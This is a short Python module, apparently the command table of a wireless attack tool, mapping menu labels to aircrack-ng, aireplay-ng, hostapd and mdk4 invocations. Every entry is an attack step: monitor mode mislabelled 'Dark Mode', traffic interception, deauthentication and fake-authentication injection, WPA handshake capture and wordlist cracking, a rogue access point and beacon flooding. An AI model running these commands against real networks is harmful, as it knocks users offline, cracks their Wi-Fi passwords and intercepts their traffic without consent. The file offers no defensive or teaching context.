from sxradeck.core.command import Command

DARKMODE_ENABLE = Command("Enable Dark Mode", cmd="airmon-ng start wlan0")
DARKMODE_DISABLE = Command("Disable Dark Mode", cmd="airmon-ng stop wlan0")
INTERCEPT_ALL = Command("Intercept All Channels", cmd="airodump-ng wlan0")
INTERCEPT_CHANNEL = Command("Intercept Select Channel", cmd="airodump-ng -c <CH> wlan0")
INTERCEPT_BSSID = Command("Intercept Target BSSID", cmd="airodump-ng --bssid <BSSID> -w out wlan0")
INJECT_DEAUTH = Command("Inject Deauth", cmd="aireplay-ng --deauth 10 -a <BSSID> wlan0")
INJECT_FAKEAUTH = Command("Inject Fakeauth", cmd="aireplay-ng --fakeauth 0 -a <BSSID> wlan0")
HANDSHAKE_CAPTURE = Command("Capture Handshake", cmd="airodump-ng -c <CH> --bssid <BSSID> -w out wlan0")
HANDSHAKE_DEAUTH = Command("Force Deauth", cmd="aireplay-ng --deauth 5 -a <BSSID> wlan0")
HANDSHAKE_CRACK = Command("Crack Handshake", cmd="aircrack-ng -w wordlist out.cap")
ROGUE_AP = Command("Rogue AP", cmd="hostapd hostapd.conf & dnsmasq")
NOISE_FLOOD = Command("Noise Flood", cmd='mdk4 wlan0 b -n "SSID"')